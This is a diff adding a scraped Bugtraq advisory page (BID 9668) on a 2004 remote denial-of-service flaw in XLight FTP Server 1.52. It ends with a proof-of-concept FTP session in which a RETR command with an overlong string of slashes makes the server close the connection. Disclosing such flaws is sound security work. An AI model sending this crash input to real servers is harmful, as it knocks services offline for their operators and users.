@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid9668<p><b><span style="font-size: 18pt;">XLight FTP Server Remote Send File Request Denial Of Service Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/9668/info">info</a><br><a href="http://www.securityfocus.com/bid/9668/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/9668/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/9668/solution">solution</a><br><a href="http://www.securityfocus.com/bid/9668/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				9668
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 16 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Feb 16 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Disclosure of this issue has been credited to "intuit e.b." &lt;intuit@linuxmail.org&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					XLight FTP Server XLight FTP Server 1.52 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required to leverage this issue.  The following proof of concept has been provided:<br/><br/>ftp&gt; open<br/>To www.example.com<br/>Connected to www.example.com.<br/>220 Xlight Server 1.52 ready...<br/>User (www.example.com:(none)): test<br/>331 Password required for test<br/>Password:<br/>230 Login OK.<br/>ftp&gt; literal pasv<br/>227 Entering passive mode .<br/>ftp&gt; literal retr /////////////////////////////////////////<br/>///////////////////////////////////////////////////////////<br/>///////////////////////////////////////////////////////////<br/>///////////////////////////////////////////////////////////<br/>//////////////////////////////////////////qwer<br/>Connection closed by remote host.
+	
+		<ul>
+</ul>
+</div>
